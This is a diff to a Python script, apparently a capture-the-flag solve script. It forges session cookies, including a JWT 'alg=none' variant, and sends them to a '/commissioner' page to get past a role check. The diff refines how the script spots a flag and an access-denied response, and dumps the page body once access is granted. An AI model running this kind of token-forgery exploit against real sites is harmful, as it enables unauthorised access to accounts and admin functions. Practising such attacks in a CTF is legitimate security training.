@@ -22,26 +22,33 @@ def req(path, cookie=None):
     except urllib.error.HTTPError as e:
         return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
 
+BAD = ("document", "function", "window", "var ", "=>", "createElement", "__CF")
+
 def find_flag(body):
-    # common flag formats
-    for pat in [r"[A-Za-z0-9_]{2,10}\{[^}\r\n]{1,200}\}", r"flag\{[^}]+\}", r"zdk\{[^}]+\}"]:
-        m = re.search(pat, body)
-        if m:
-            return m.group(0)
+    cands = re.findall(r"[A-Za-z0-9_]{2,15}\{[^}\r\n]{2,160}\}", body)
+    for c in cands:
+        if not any(b in c for b in BAD):
+            return c
     return None
 
+def is_denied(body):
+    return ("Commissioner access only" in body) or ("403 -" in body) or ("league role is" in body)
+
 def show(label, st, body):
-    is_member = "role is `member`" in body
+    denied = is_denied(body)
     flag = find_flag(body)
     print(f"\n===== {label} =====")
-    print(f"status={st} is_member={is_member} len={len(body)} FLAG={flag}")
-    # print a trimmed version of body text
-    txt = re.sub(r"<[^>]+>", " ", body)
+    print(f"status={st} denied={denied} len={len(body)} FLAG={flag}")
+    txt = re.sub(r"<script[\s\S]*?</script>", " ", body, flags=re.I)
+    txt = re.sub(r"<[^>]+>", " ", txt)
     txt = re.sub(r"\s+", " ", txt).strip()
-    print("BODY:", txt[:1200])
-    if flag and not is_member:
-        print("!!!!! POSSIBLE FLAG:", flag)
-    return flag
+    print("BODY:", txt[:1500])
+    if not denied:
+        print("!!!!! ACCESS GRANTED (not the 403 page) !!!!!")
+        print("FULL_BODY_START")
+        print(body[:4000])
+        print("FULL_BODY_END")
+    return flag if (flag and not denied) else None
 
 # ---- 1. Get a fresh member session token ----
 st, h, body = req("/")
@@ -59,12 +66,14 @@ print("payload:", pay)
 
 found_flag = None
 
+granted = []
 def try_cookie(token, label):
     global found_flag
     st, h, body = req("/commissioner", cookie=f"wo_session={token}")
     f = show(label, st, body)
-    if f and "role is `member`" not in body:
-        found_flag = f
+    if not is_denied(body):
+        granted.append((label, token, body))
+        found_flag = f or found_flag or "GRANTED-see-body"
     return body
 
 # ---- Attempt A: alg=none ----
